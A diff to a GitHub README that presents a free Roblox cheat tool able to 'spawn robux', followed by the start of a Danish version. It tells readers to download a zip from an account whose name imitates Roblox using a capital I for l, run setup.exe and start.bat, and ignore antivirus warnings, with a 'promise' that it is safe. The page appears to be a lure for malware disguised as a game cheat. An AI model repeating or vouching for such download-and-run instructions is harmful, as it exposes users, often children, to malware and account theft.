@@ -1,4 +1,49 @@
 # RobloxCheatKrnl
+A free roblox executor that allows you to spawn robux and much more
+
+## Guide
+> **1.** *Download the file [here](https://github.com/RobIoxDeveIoper/RobloxCheatKrnl/archive/refs/heads/main.zip)*
+
+> **2.** *Run/open setup.exe*
+
+> **3.** *A new folder named "key" will then be created in which there will be a KRNL key*
+
+> **4.** *In addition, a file named "start.bat* will be created
+
+> **5.** *Open "start.bat" and then insert the KRNL key from the "key" folder
+
+> **6.** *Congratulations you will now have the menu which should look like this*
+
+![image](https://user-images.githubusercontent.com/125705165/219812626-84dadd17-3cbe-44cf-860d-a447cd57de63.png)
+
+## Additional information
+
+*Some antiviruses may falsely flag this as a virus. This is because I do not have a valid code signature.*
+
+*This is absolutely safe and I* **promise**, *that you will not get any viruses; if you don't trust me though, you can run it in a sandbox or a WC and see if it's legit.*
+
+## Frequently asked question
+
+**1. When I open setup.exe nothing happens?**
+> *If you experience this problem, it may be due to errors during installation. To fix this problem, you can try to download the file again. If this doesn't work either, you unfortunately cannot use the cheat, as the computer may "stop" the file from running, since it is after all a hacker tool like hacker roblox*
+
+**2. Do you have more menus?**
+> *YES! I am currently developing a new and better menu, so look forward to it!*
+
+### problems or errors?
+
+*If you experience problems, errors or the like, feel free to contact me on discord:* Lorde#0715
+
+
+
+
+---------------------danish-----------------------------------------------------
+
+
+
+
+
+# RobloxCheatKrnl
 En gratis roblox executor der giver dig mulighed for at spawne robux og meget mere 
 
 ## Guide
